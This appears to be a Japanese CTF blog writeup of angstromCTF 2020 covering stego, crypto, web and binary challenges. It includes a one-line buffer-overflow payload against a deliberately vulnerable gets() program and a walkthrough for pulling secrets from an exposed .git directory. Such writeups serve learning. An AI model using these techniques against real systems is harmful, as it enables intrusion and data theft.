---
title: angstromCTF 2020 Writeup
date: 2019-03-24
tags: ["CTF", "Writeup"]
excerpt: angstromCTF 2020 Writeup
---


# angstromCTF 2020 writeup
チームKUDoSで参加しました。  
参加した時点でチームの方々がcryptoとか解いてくれていたので、普段あまりやらないジャンルに手を付けるいい機会になったと思います。難易度も易しめでちょうどよかったです。  
## MISC
### PSK *90pts*
Only 31 bps!!とタイトルからググっていくと、PSK31( https://ja.wikipedia.org/wiki/PSK31 )が引っかかる。どうやらアマチュア無線の変調方式らしいです。  
ソフトを探して音を流すとflagを貰えました。  
`actf{hamhamhamhamham}`

### msd *140pts*
steganographyの問題。  
pythonのスクリプトと元画像`breathe.jpg`、処理が施された画像`output.png`が渡されます。  

スクリプトを見た感じ、
- flagをascii変換
- `breathe.jpg`の各ピクセルのRGB値を取得
- flagを一文字ずつ取得し、先ほど取得したピクセルパラメータをの最上位桁を置き換える
- 置き換えられたパラメータで新しい画像`output.png`を作成、出力

といった処理をしているようです。  
なのでそれぞれの画像のピクセルを取得し、その最上位桁からflagのascii値を取得します。
```py
output = Image.open('output.png')
image = Image.open('breathe.jpg')
outdata = []
for j in range(167):
    for i in range(301):
        for a in output.getpixel((i,j)):
            outdata.append(a)
imdata = []
for j in range(167):
    for i in range(301):
        for a in image.getpixel((i,j)):
            imdata.append(a)
enc = ""
for i in range(167*301):
    s = list(str(outdata[i]))[0]
    l = list(str(imdata[i]))[0]
    if len(str(outdata[i])) == len(str(imdata[i])):
        enc += s
    else:
        enc += "0"
```
戻しました。
actf{はasciiに変換すると9799116102123、}は125なので、それをもとに適当に探します。  
それっぽい箇所を発見：979911610212310511010497108101951011201049710810195101122112122454950514857981051031031211049798121125  
上記の処理した時の値が255以上になる場合、強制的に最上位桁は2になってしまうので復元が難しいかなとも思いましたが、この箇所はそのまま戻せばflagになりました。    
`actf{inhale_exhale_ezpz-12309biggyhaby}`

## WEB
### Git Good *70pts*
https://gitgood.2020.chall.actf.co/.git/refs/heads/master にアクセスするとファイルがダウンロードできるので、.gitが存在することが分かります。  
dvcs-ripperでダウンロードすると`thisisflag.txt`というファイルを発見できたものの、中身は`There used to be a flag here...`となっていました。  
おそらく以前のコミットまで戻れば見れそうなので、`.git/logs/HEAD`でhashを確認します。

```
0000000000000000000000000000000000000000 6b3c94c0b90a897f246f0f32dec3f5fd3e40abb5 aplet123 <jasonqan2004@gmail.com> 1583598444 +0000	commit (initial): haha I lied this is the actual initial commit
6b3c94c0b90a897f246f0f32dec3f5fd3e40abb5 e975d678f209da09fff763cd297a6ed8dd77bb35 aplet123 <jasonqan2004@gmail.com> 1583598464 +0000	commit: Initial commit
```
２つありました。最初のコミットに戻します。
```sh
git reset --hard 6b3c94c0b90a897f246f0f32dec3f5fd3e40abb5
cat thisistheflag.txt
```
今度こそflagでした。  
`actf{b3_car3ful_wh4t_y0u_s3rve_wi7h}`


## CRYPTO
### Discrete Superlog *130pts*
時間内に解けず、翌日やっと解くことができました。  
ncすると以下の文が表示されます。  
```
We define a^^b to be such that a^^0 = 1 and a^^b = a^(a^^(b-1)), where x^y represents x to the power of y.
Given this, find a positive integer x such that a^^x = b mod p.
Generating challenge 1 of 10...
p = 1019271125739705316279
a = 1015925667949204155909
b = 602722157541271651690
Enter x:
```
演算子`^^`はテトレーションを行っているようです。テトレーションなんて人生で使ったことなかった…。  
hintが`just do it lmao`ということで、なんとなく総当たりで行けそうな気配がします。  

`a^^x == a^(a^^(x-1))`なので、今求めたい答えは`a^(a^^(x-1)) % p`です。  
また、フェルマーの小定理から`pow(a, x, p) == pow(a, x%φ(p), p)`なので、`a^^(x-1) % φ(p)`をφ(p)が1になるかxが0になるかまで繰り返せば`a^^x % p`が求まります。  
これがbと等しくなるまでxを増やして１つずつ調べていきます。  
```py
from sympy.ntheory.factor_ import totient

def get_mod(a,x,p):
    if p == 1 or x == 0:
        return 1
    return pow(a, get_mod(a, x-1, totient(p)), p)

p = 51831266554459153392984128647663219693921
a = 36612126156926215850089341284343533592108
b = 16363626835678867285668870188112986635199

x = 0
while True:
    if get_mod(a,x,p) == b:
        break
    x += 1

print(x)
```
上手いことncで受け取ったデータの切り分けができなかったので、問題を手動コピペする方式のソルバです。    
大体は数秒で答えが求まりましたが、そこそこ時間がかかりそうなこともあったので数回ncし直して問題ガチャしました。  
10回正解するとflagがもらえます。  
`actf{lets_stick_to_discrete_log_for_now...}`

## BINARY
### No Canary *50pts*
```c
// 省略
void flag() {
	system("/bin/cat flag.txt");
}

int main() {
	// 省略
	printf("What's your name? ");

	char name[20];
	gets(name);

	printf("Nice to meet you, %s!\n", name);
}
```
用意されたサーバにこんな感じのcのソースと実行ファイル、flag.txtがあります。  
20文字以上を投げつけるとsegmentation faultになり、バッファオーバーフローを引き起こせるので、村人A的な解法と予想。  
gdbでflag()のアドレスと、main()とnameのオフセットを確認するとそれぞれ`0x0000000000401186`と`40`でした。
```sh
(python -c "print 'a' * 40 + '\x86\x11\x40\x00\x00\x00\x00\x00';") | ./no_canary`
```
実行するとflagが表示されます。  
`actf{that_gosh_darn_canary_got_me_pwned!}`
